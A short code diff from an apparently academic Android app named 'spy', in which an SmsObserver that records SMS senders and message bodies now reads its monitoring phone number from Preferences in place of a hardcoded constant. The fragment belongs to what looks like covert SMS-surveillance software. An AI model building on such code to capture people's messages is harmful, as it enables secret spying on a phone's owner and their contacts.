@@ -8,8 +8,8 @@ import android.os.Handler;
 import android.util.Log;
 
 import edu.uj.jkordas.spy.DAO.SmsDataSource;
-import edu.uj.jkordas.spy.PredefinedValues;
 import edu.uj.jkordas.spy.developer.Logger;
+import edu.uj.jkordas.spy.settings.Preferences;
 
 public class SmsObserver extends ContentObserver {
 
@@ -63,7 +63,7 @@ public class SmsObserver extends ContentObserver {
                             SmsDataSource datasource = new SmsDataSource(context);
                             datasource.open();
 
-                            datasource.addSMS(PredefinedValues.phoneNumber, address, body);
+                            datasource.addSMS(Preferences.phoneNumber, address, body);
                             datasource.close();
                         }
 
